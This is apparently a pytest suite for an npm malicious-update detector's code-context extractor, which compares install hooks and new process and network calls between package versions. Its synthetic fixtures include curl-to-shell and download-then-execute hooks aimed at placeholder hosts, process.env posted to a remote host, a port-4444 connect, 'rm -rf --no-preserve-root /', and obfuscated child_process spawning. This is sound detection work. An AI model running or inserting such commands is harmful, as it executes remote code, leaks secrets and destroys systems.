"""X1 코드 문맥 extractor 테스트. 합성 패키지 파일만 쓰며 어떤 코드도 실행하지 않는다."""

from __future__ import annotations

from datetime import datetime, timezone
from pathlib import Path

import pytest

from depbee_analyzer.core.models import PackageVersionSnapshot
from depbee_analyzer.core.pipeline import resolve_extractors
from depbee_analyzer.extractors import EXTRACTOR_REGISTRY, OPTIONAL_EXTRACTOR_REGISTRY
from depbee_analyzer.extractors.code_context import (
    FEATURE_NAMES,
    CodeContextExtractor,
    command_segments,
    count_calls,
)


def _snapshot(version: str, root: Path | None, scripts: dict | None = None, **package_json) -> PackageVersionSnapshot:
    body = {"name": "sample-pkg", "version": version, **package_json}
    if scripts is not None:
        body["scripts"] = scripts
    return PackageVersionSnapshot(
        package="sample-pkg",
        version=version,
        published_at=datetime(2024, 1, 1, tzinfo=timezone.utc),
        package_json=body,
        source_dir=root,
    )


def _tree(root: Path, files: dict[str, str]) -> Path:
    root.mkdir(parents=True, exist_ok=True)
    for relative, text in files.items():
        path = root / relative
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text(text, encoding="utf-8")
    return root


def _pair(tmp_path: Path, old_files: dict, new_files: dict, old_scripts=None, new_scripts=None):
    old = _snapshot("1.0.0", _tree(tmp_path / "old", old_files), old_scripts)
    new = _snapshot("1.0.1", _tree(tmp_path / "new", new_files), new_scripts)
    return old, new


@pytest.fixture
def extractor() -> CodeContextExtractor:
    return CodeContextExtractor()


# --- 등록·스키마 -------------------------------------------------------------

def test_is_optional_and_not_in_default_registry() -> None:
    assert "code_context" not in EXTRACTOR_REGISTRY
    assert OPTIONAL_EXTRACTOR_REGISTRY["code_context"] is CodeContextExtractor
    assert {e.name for e in resolve_extractors(None)} == {"package_json", "obfuscation"}


def test_can_be_selected_by_name_with_existing_extractors() -> None:
    names = [e.name for e in resolve_extractors(["package_json", "obfuscation", "code_context"])]
    assert names == ["package_json", "obfuscation", "code_context"]


def test_declares_source(extractor: CodeContextExtractor) -> None:
    assert "source" in extractor.required_data


def test_emits_fixed_columns_that_do_not_collide_with_existing_features(tmp_path, extractor) -> None:
    old, new = _pair(tmp_path, {"index.js": "1"}, {"index.js": "1"})
    features = extractor.extract(old, new)
    assert list(features) == list(FEATURE_NAMES)
    existing = {"installScriptPresent", "installScriptAdded", "scriptEntryAdded", "newDependencyAdded",
                "newDependencyCount", "updateType", "updateInterval"}
    assert not existing & set(features)
    assert not any(name.startswith("obf") for name in features)


# --- A 유형: 설치 훅 ---------------------------------------------------------

def test_no_install_hooks_is_zero_not_missing(tmp_path, extractor) -> None:
    old, new = _pair(tmp_path, {"index.js": "1"}, {"index.js": "2"}, {"test": "jest"}, {"test": "jest"})
    features = extractor.extract(old, new)
    assert features["installHookNewProgramCount"] == 0
    assert features["installHookArgsChanged"] is False
    assert features["installHookRefFileChanged"] is False


def test_added_hook_counts_new_programs_including_inside_sh_c(tmp_path, extractor) -> None:
    old, new = _pair(
        tmp_path, {}, {},
        {"postinstall": "node-gyp rebuild"},
        {"postinstall": 'node-gyp rebuild && sh -c "curl -o /tmp/a https://x.example && sh /tmp/a"'},
    )
    features = extractor.extract(old, new)
    # 새 프로그램: sh, curl (node-gyp은 이전에도 있었다)
    assert features["installHookNewProgramCount"] == 2
    assert features["installHookArgsChanged"] is False  # 프로그램 구성이 바뀌었으므로 인자만 변경이 아니다


def test_args_only_change_in_existing_hook(tmp_path, extractor) -> None:
    old, new = _pair(
        tmp_path, {}, {},
        {"postinstall": "node-gyp rebuild --release"},
        {"postinstall": "node-gyp rebuild --release --target=https://evil.example"},
    )
    features = extractor.extract(old, new)
    assert features["installHookNewProgramCount"] == 0
    assert features["installHookArgsChanged"] is True


def test_identical_hooks_and_whitespace_only_change_are_not_changes(tmp_path, extractor) -> None:
    old, new = _pair(
        tmp_path, {"install.js": "x"}, {"install.js": "x"},
        {"postinstall": "node install.js"}, {"postinstall": "node   install.js "},
    )
    features = extractor.extract(old, new)
    assert features["installHookNewProgramCount"] == 0
    assert features["installHookArgsChanged"] is False
    assert features["installHookRefFileChanged"] is False


def test_env_assignment_and_redirect_target_are_not_programs() -> None:
    assert command_segments("NODE_ENV=prod node a.js > /dev/null 2>&1") == [["node", "a.js", "2"]]


def test_unparsable_hook_is_missing_not_zero(tmp_path, extractor) -> None:
    old, new = _pair(tmp_path, {}, {}, {"postinstall": "node a.js"}, {"postinstall": "node 'a.js"})
    features = extractor.extract(old, new)
    assert features["installHookNewProgramCount"] is None
    assert features["installHookArgsChanged"] is None
    assert features["installHookRefFileChanged"] is None


def test_malformed_scripts_object_is_missing(tmp_path, extractor) -> None:
    old, new = _pair(tmp_path, {}, {}, {"postinstall": "node a.js"}, None)
    new.package_json["scripts"] = ["postinstall"]
    assert extractor.extract(old, new)["installHookNewProgramCount"] is None


def test_referenced_file_changed(tmp_path, extractor) -> None:
    old, new = _pair(
        tmp_path, {"scripts/setup.js": "console.log(1)"}, {"scripts/setup.js": "require('child_process').exec('x')"},
        {"postinstall": "node ./scripts/setup.js"}, {"postinstall": "node ./scripts/setup.js"},
    )
    assert extractor.extract(old, new)["installHookRefFileChanged"] is True


def test_referenced_file_added_with_node_extension_resolution(tmp_path, extractor) -> None:
    old, new = _pair(tmp_path, {}, {"setup/index.js": "x"}, {}, {"preinstall": "node setup"})
    assert extractor.extract(old, new)["installHookRefFileChanged"] is True


def test_referenced_shell_script_unchanged(tmp_path, extractor) -> None:
    old, new = _pair(
        tmp_path, {"build.sh": "echo hi"}, {"build.sh": "echo hi"},
        {"install": "./build.sh"}, {"install": "bash build.sh"},
    )
    assert extractor.extract(old, new)["installHookRefFileChanged"] is False


def test_missing_referenced_file_is_missing(tmp_path, extractor) -> None:
    old, new = _pair(tmp_path, {}, {}, {}, {"postinstall": "node not-shipped.js"})
    assert extractor.extract(old, new)["installHookRefFileChanged"] is None


def _hooks(tmp_path, extractor, old_scripts, new_scripts, old_files=None, new_files=None):
    old, new = _pair(tmp_path, old_files or {}, new_files or {}, old_scripts, new_scripts)
    f = extractor.extract(old, new)
    return f["installHookRefFileChanged"], f["installHookNewExternalExecCount"]


def test_download_then_execute_outside_package(tmp_path, extractor) -> None:
    # 개선 전: installHookRefFileChanged=None. 이제 내부 파일 변경 없음(False) + 새 외부 실행 1
    old, new = _pair(tmp_path, {}, {}, {}, {"postinstall": "curl -o /tmp/a https://x.example && sh /tmp/a"})
    features = extractor.extract(old, new)
    assert features["installHookRefFileChanged"] is False
    assert features["installHookNewExternalExecCount"] == 1
    assert features["installHookNewProgramCount"] == 2


def test_download_to_relative_path_then_execute_is_external(tmp_path, extractor) -> None:
    # 패키지에 없는 ./x.sh를 설치 중 내려받아 실행: 내부 파일 '누락'이 아니라 외부 실행이다
    assert _hooks(tmp_path, extractor, {}, {"install": "wget -qO ./x.sh https://x.example/x.sh; bash ./x.sh"}) == (False, 1)


def test_download_via_redirect_then_execute_is_external(tmp_path, extractor) -> None:
    assert _hooks(tmp_path, extractor, {}, {"install": "curl -sL https://x.example > run.sh && sh run.sh"}) == (False, 1)


def test_download_piped_to_shell_is_external(tmp_path, extractor) -> None:
    assert _hooks(tmp_path, extractor, {}, {"postinstall": "curl -fsSL https://x.example/i.sh | bash"}) == (False, 1)


def test_same_external_path_already_executed_by_old_version(tmp_path, extractor) -> None:
    old = {"postinstall": "curl -o /tmp/a https://cdn.vendor/a && sh /tmp/a"}
    new = {"postinstall": "curl -o /tmp/a https://evil.example/a && sh /tmp/a"}
    features_ref, external = _hooks(tmp_path, extractor, old, new)
    assert external == 0  # 같은 외부 실행 대상: 새로 생긴 것이 아니다(URL 변경은 installHookArgsChanged가 본다)
    assert features_ref is False


def test_new_external_target_added_next_to_existing_one(tmp_path, extractor) -> None:
    old = {"postinstall": "sh /opt/vendor/setup.sh"}
    new = {"postinstall": "sh /opt/vendor/setup.sh && node $HOME/.cache/x.js && ~/bin/run"}
    assert _hooks(tmp_path, extractor, old, new) == (False, 2)


def test_internal_file_execution_is_not_external(tmp_path, extractor) -> None:
    assert _hooks(tmp_path, extractor, {}, {"postinstall": "node scripts/install.js"},
                  new_files={"scripts/install.js": "1"}) == (True, 0)


def test_path_used_only_as_plain_argument_is_not_an_execution_target(tmp_path, extractor) -> None:
    # /tmp 경로가 cp·node의 두 번째 인자일 뿐이고 실행되는 것은 패키지 안 build.js다
    new = {"postinstall": "cp /tmp/cache.json ./cache.json && node build.js /tmp/out"}
    assert _hooks(tmp_path, extractor, {}, new, new_files={"build.js": "1"}) == (True, 0)


def test_download_without_executing_it_is_not_external_execution(tmp_path, extractor) -> None:
    assert _hooks(tmp_path, extractor, {}, {"postinstall": "curl -o /tmp/a https://x.example"}) == (False, 0)


def test_external_execution_needs_no_source_tree(tmp_path, extractor) -> None:
    old = _snapshot("1.0.0", None, {})
    new = _snapshot("1.0.1", None, {"postinstall": "curl -o /tmp/a https://x.example && sh /tmp/a"})
    features = extractor.extract(old, new)
    assert features["installHookNewExternalExecCount"] == 1
    assert features["installHookRefFileChanged"] is False  # 내부 실행 대상이 없다


def test_missing_internal_file_stays_missing_with_external_target(tmp_path, extractor) -> None:
    new = {"postinstall": "node not-shipped.js && sh /tmp/a"}
    assert _hooks(tmp_path, extractor, {}, new) == (None, 1)


def test_unparsable_hook_makes_external_count_missing(tmp_path, extractor) -> None:
    assert _hooks(tmp_path, extractor, {}, {"postinstall": "sh '/tmp/a"}) == (None, None)


def test_inline_node_code_has_no_file_reference(tmp_path, extractor) -> None:
    old, new = _pair(tmp_path, {}, {}, {}, {"postinstall": "node -e \"require('./x')\""})
    assert extractor.extract(old, new)["installHookRefFileChanged"] is False


def test_oversized_referenced_file_is_missing(tmp_path) -> None:
    old, new = _pair(tmp_path, {"a.js": "1"}, {"a.js": "x" * 100}, {"postinstall": "node a.js"}, {"postinstall": "node a.js"})
    features = CodeContextExtractor(max_file_bytes=50).extract(old, new)
    assert features["installHookRefFileChanged"] is None


# --- C 유형: 변경 JS의 호출 --------------------------------------------------

def test_added_process_execution_call(tmp_path, extractor) -> None:
    old, new = _pair(
        tmp_path,
        {"index.js": "module.exports = 1;\n"},
        {"index.js": "const cp = require('child_process');\ncp.exec('curl x | sh');\nmodule.exports = 1;\n"},
    )
    features = extractor.extract(old, new)
    assert features["addedProcExecCallCount"] == 1
    assert features["addedNetworkCallCount"] == 0


def test_added_network_calls_node_builtins_and_libraries(tmp_path, extractor) -> None:
    new_code = (
        "const https = require('node:https');\n"
        "import axios from 'axios';\n"
        "https.request({host: 'x'});\n"
        "axios.post('https://x', process.env);\n"
        "fetch('https://y');\n"
    )
    old, new = _pair(tmp_path, {"index.js": "1"}, {"index.js": new_code})
    assert extractor.extract(old, new)["addedNetworkCallCount"] == 3


def test_same_code_in_old_and_new_counts_zero(tmp_path, extractor) -> None:
    code = "const { spawn } = require('child_process'); spawn('x'); fetch('https://e');"
    old, new = _pair(tmp_path, {"a.js": code}, {"a.js": code + "\n// touched"})
    features = extractor.extract(old, new)
    assert (features["addedProcExecCallCount"], features["addedNetworkCallCount"]) == (0, 0)


def test_unchanged_files_with_calls_are_not_counted(tmp_path, extractor) -> None:
    code = "require('child_process').execSync('id'); fetch('u');"
    old, new = _pair(tmp_path, {"a.js": code, "b.js": "1"}, {"a.js": code, "b.js": "2"})
    features = extractor.extract(old, new)
    assert (features["addedProcExecCallCount"], features["addedNetworkCallCount"]) == (0, 0)


def test_keywords_only_in_comments_and_strings_are_not_calls(tmp_path, extractor) -> None:
    new_code = (
        "// require('child_process').exec('rm -rf /')\n"
        "/* fetch('https://evil') */\n"
        "const doc = \"require('child_process').exec('x'); fetch('y')\";\n"
        "const tpl = `cp.exec(${'a'}) http.request()`;\n"
    )
    old, new = _pair(tmp_path, {"a.js": "1"}, {"a.js": new_code})
    features = extractor.extract(old, new)
    assert (features["addedProcExecCallCount"], features["addedNetworkCallCount"]) == (0, 0)


def test_regexp_exec_is_not_process_execution() -> None:
    assert count_calls("const re = /a\\/b/g; re.exec(s); /x/.exec(t); exec(s);") == (0, 0)


def test_minified_bundle_counts_net_difference_not_whole_line(tmp_path, extractor) -> None:
    old_code = 'var a=require("child_process");a.exec(x);fetch(u);'
    new_code = 'var a=require("child_process");a.exec(x);a.spawn(y);fetch(u);fetch(v);'
    old, new = _pair(tmp_path, {"dist/x.min.js": old_code}, {"dist/x.min.js": new_code})
    features = extractor.extract(old, new)
    assert (features["addedProcExecCallCount"], features["addedNetworkCallCount"]) == (1, 1)


def _added(tmp_path, extractor, old_code: str, new_code: str) -> tuple[int, int]:
    old, new = _pair(tmp_path, {"a.js": old_code}, {"a.js": new_code})
    features = extractor.extract(old, new)
    return features["addedProcExecCallCount"], features["addedNetworkCallCount"]


def test_same_count_but_network_target_changed(tmp_path, extractor) -> None:
    assert _added(tmp_path, extractor, 'fetch("https://api.example/v1");', 'fetch("https://collect.evil/x");') == (0, 1)


def test_same_count_but_command_changed(tmp_path, extractor) -> None:
    old = "const { exec } = require('child_process'); exec('git rev-parse HEAD');"
    new = "const { exec } = require('child_process'); exec('curl -s https://x | sh');"
    assert _added(tmp_path, extractor, old, new) == (1, 0)


def test_one_call_removed_and_another_added_in_same_file(tmp_path, extractor) -> None:
    old = "const cp = require('child_process'); cp.exec('a'); const h = require('https'); h.get('u1');"
    new = "const cp = require('child_process'); cp.spawn('b'); const h = require('https'); h.request('u2');"
    assert _added(tmp_path, extractor, old, new) == (1, 1)


def test_port_number_change_is_a_changed_call(tmp_path, extractor) -> None:
    old = "const n = require('net'); n.connect(80, 'localhost');"
    new = "const n = require('net'); n.connect(4444, 'localhost');"
    assert _added(tmp_path, extractor, old, new) == (0, 1)


def test_minifier_renaming_and_reordering_is_not_a_change(tmp_path, extractor) -> None:
    old = 'var a=require("child_process"),b=require("https");a.exec("ls",c);b.get("https://u",d);fetch(e);'
    new = 'var x=require("child_process"),y=require("https");fetch(q);y.get("https://u",z);x.exec("ls",w);'
    assert _added(tmp_path, extractor, old, new) == (0, 0)


def test_target_change_through_variable_only_is_not_detected(tmp_path, extractor) -> None:
    """한계 고정: 리터럴이 아닌 변수로만 전달된 대상 변경은 서명이 같아 0이다(문서화된 동작)."""
    old = "const cp = require('child_process'); cp.exec(cmd);"
    new = "const cp = require('child_process'); cp.exec(otherCmd);"
    assert _added(tmp_path, extractor, old, new) == (0, 0)


def test_own_version_string_in_arguments_is_not_a_change(tmp_path, extractor) -> None:
    # _pair는 old 1.0.0, new 1.0.1이다. 빌드가 자기 버전을 인자에 넣는 경우(esbuild 실제 사례)
    old = "const cp = require('child_process'); cp.spawn('bin', ['--version=1.0.0', '--ping']);"
    new = "const cp = require('child_process'); cp.spawn('bin', ['--version=1.0.1', '--ping']);"
    assert _added(tmp_path, extractor, old, new) == (0, 0)


def test_other_version_like_literal_change_is_still_a_change(tmp_path, extractor) -> None:
    old = "fetch('https://cdn.example/lib@2.3.4/x.js');"
    new = "fetch('https://cdn.example/lib@9.9.9/x.js');"
    assert _added(tmp_path, extractor, old, new) == (0, 1)


def test_alias_and_module_member_forms_share_one_signature(tmp_path, extractor) -> None:
    old = "const cp = require('child_process'); cp.exec('id');"
    new = "require('child_process').exec('id');"
    assert _added(tmp_path, extractor, old, new) == (0, 0)


def test_removed_calls_do_not_go_negative(tmp_path, extractor) -> None:
    old, new = _pair(tmp_path, {"a.js": "require('child_process').exec(a);"}, {"a.js": "1"})
    assert extractor.extract(old, new)["addedProcExecCallCount"] == 0


def test_new_file_calls_are_counted(tmp_path, extractor) -> None:
    old, new = _pair(tmp_path, {"a.js": "1"}, {"a.js": "1", "lib/payload.cjs": "const n=require('net'); n.connect(4444,'h');"})
    assert extractor.extract(old, new)["addedNetworkCallCount"] == 1


def test_missing_source_tree_makes_code_features_missing_but_hooks_computed(tmp_path, extractor) -> None:
    old = _snapshot("1.0.0", None, {"postinstall": "node-gyp rebuild"})
    new = _snapshot("1.0.1", None, {"postinstall": "node-gyp rebuild && curl https://x"})
    features = extractor.extract(old, new)
    assert features["addedProcExecCallCount"] is None
    assert features["addedNetworkCallCount"] is None
    assert features["installHookNewProgramCount"] == 1
    assert features["installHookRefFileChanged"] is False  # 참조 파일 없음


def test_size_limit_makes_code_features_missing(tmp_path) -> None:
    old, new = _pair(tmp_path, {"a.js": "1"}, {"a.js": "fetch(u);" * 20})
    features = CodeContextExtractor(max_file_bytes=50).extract(old, new)
    assert features["addedNetworkCallCount"] is None
    assert features["addedProcExecCallCount"] is None


def test_file_count_limit_makes_code_features_missing(tmp_path) -> None:
    old, new = _pair(tmp_path, {"a.js": "1"}, {f"f{i}.js": "1" for i in range(5)})
    features = CodeContextExtractor(max_file_count=3).extract(old, new)
    assert features["addedNetworkCallCount"] is None


def test_undecodable_bytes_are_analyzed_not_dropped(tmp_path, extractor) -> None:
    old, new = _pair(tmp_path, {"a.js": "1"}, {})
    (tmp_path / "new" / "a.js").write_bytes(b"\xff\xfe fetch('u');")
    assert extractor.extract(old, new)["addedNetworkCallCount"] == 1


# --- 실제 악성 20쌍 검증 후 보완: 설치 훅 해석 ------------------------------------

def test_bun_run_identifies_the_executed_file(tmp_path, extractor) -> None:
    # D06 mini-shai-hulud 46쌍의 `bun run index.js`: 이전에는 'run'을 파일로 보아 None이었다
    assert _hooks(tmp_path, extractor, {}, {"preinstall": "bun run index.js"}, new_files={"index.js": "1"}) == (True, 0)


def test_deno_run_with_flags_identifies_the_executed_file(tmp_path, extractor) -> None:
    assert _hooks(tmp_path, extractor, {}, {"postinstall": "deno run --allow-net src/main.ts"},
                  new_files={"src/main.ts": "1"}) == (True, 0)


def test_run_with_package_script_name_has_no_file_reference(tmp_path, extractor) -> None:
    assert _hooks(tmp_path, extractor, {}, {"postinstall": "bun run build && node --run prepare"}) == (False, 0)


def test_variable_interpreter_is_not_an_external_path(tmp_path, extractor) -> None:
    # D06 kraken-api의 `$NODE lint.js`: 이전에는 외부 실행 1, 내부 lint.js는 놓쳤다
    assert _hooks(tmp_path, extractor, {}, {"postinstall": "$NODE lint.js"}, new_files={"lint.js": "1"}) == (True, 0)
    assert _hooks(tmp_path, extractor, {}, {"install": "${npm_node_execpath} ./x.js"}, new_files={"x.js": "1"}) == (True, 0)


def test_variable_package_manager_with_script_name(tmp_path, extractor) -> None:
    assert _hooks(tmp_path, extractor, {}, {"postinstall": "$npm_execpath run build"}) == (False, 0)


def test_variable_prefixed_path_is_still_external(tmp_path, extractor) -> None:
    assert _hooks(tmp_path, extractor, {}, {"postinstall": "$HOME/.cache/run.sh"}) == (False, 1)


def test_bare_variable_as_execution_target_is_unknown_not_external(tmp_path, extractor) -> None:
    assert _hooks(tmp_path, extractor, {}, {"postinstall": "node $SCRIPT"}) == (None, 0)


def test_shell_builtins_are_not_programs(tmp_path, extractor) -> None:
    old, new = _pair(tmp_path, {}, {"a.js": "1"}, {}, {"postinstall": "node a.js || true; : noop; exit 0"})
    assert extractor.extract(old, new)["installHookNewProgramCount"] == 1  # node만


def test_sudo_is_a_wrapper_with_value_options() -> None:
    assert command_segments("sudo rm -rf --no-preserve-root /") == [["rm", "-rf", "--no-preserve-root", "/"]]
    assert command_segments("sudo -u root -E node x.js") == [["node", "x.js"]]


# --- 실제 악성 20쌍 검증 후 보완: C 유형 모듈 참조 ----------------------------------

def test_concatenated_module_name_literal() -> None:
    # D06 node-gyp-dll @pkgr/core의 require('chi'+'ld_pro'+'cess')
    assert count_calls("const cp = require('chi' + 'ld_pro' + 'cess'); cp.spawn('rundll32', [x]);") == (1, 0)
    assert count_calls("require('ht'+'tps').get('https://x');") == (0, 1)


def test_create_require_alias_and_direct_call() -> None:
    code = ("import { createRequire } from 'module';\n"
            "const req = createRequire(import.meta.url);\n"
            "const cp = req('child_process'); cp.execSync('id');\n"
            "createRequire(import.meta.url)('child_process').spawn('x');\n"
            "module.createRequire(__filename)('https').get(u);\n")
    assert count_calls(code) == (2, 1)


def test_stored_function_reference_then_called() -> None:
    # D06 conventional-changelog의 var x = require('child_process').spawn
    assert count_calls("var runner = require('child_process').spawn;\nrunner('sh', ['-c', cmd]);") == (1, 0)
    assert count_calls("const cp = require('child_process'); const sp = cp.spawn; sp('a');") == (1, 0)


def test_new_module_reference_forms_do_not_create_false_positives() -> None:
    benign = [
        "require('child_' + name).exec(x);",                      # 변수가 섞인 결합: 해석하지 않음
        "require('./lib/' + 'util').exec(x);",                    # 다른 모듈
        "const req = createRequire(import.meta.url); req('fs').readFileSync('a'); req('./exec.js').exec('b');",
        "var runner = require('child_process').spawn;",           # 담기만 하고 호출 없음
        "var runner = require('child_process').spawn; obj.runner('x'); this.runner('y');",
        "const t = \"var r = require('chi'+'ld_process').exec; r('x')\";",  # 문자열 안
        "const p = require('path'); const join = p.join; join('a', 'b');",
        "const re = /x/g; const exec = re.exec; exec.call(re, s);",
    ]
    for code in benign:
        assert count_calls(code) == (0, 0), code


def test_call_on_require_result_is_not_treated_as_module_alias() -> None:
    # 이전에는 child가 child_process alias로 잡혀 child.kill()·child.exec(...)을 셀 수 있었다
    code = "const child = require('child_process').spawn('x'); child.on('exit', f); child.kill();"
    assert count_calls(code) == (1, 0)


def test_literal_bracket_member_access_on_module() -> None:
    # D06 node-gyp-dll @pkgr/core: require('chi'+'ld_pro'+'cess')["sp"+"awn"]("rund"+"ll32", [...])
    code = "require('chi'+'ld_pro'+'cess')[\"sp\"+\"awn\"](\"rund\"+\"ll32\", [p + ',main']);"
    assert count_calls(code) == (1, 0)
    assert count_calls("const cp = require('child_process'); cp['execSync']('id');") == (1, 0)


def test_bracket_access_without_module_binding_or_with_variable_key_is_not_counted() -> None:
    for code in [
        "obj['exec']('x');",                                           # 모듈에 묶이지 않은 객체
        "const cp = require('child_process'); cp[name]('x');",         # 변수 키: 해석하지 않음
        "const re = /a/; re['exec'](s);",
        "const p = require('path'); p['join']('a', 'b');",
    ]:
        assert count_calls(code) == (0, 0), code
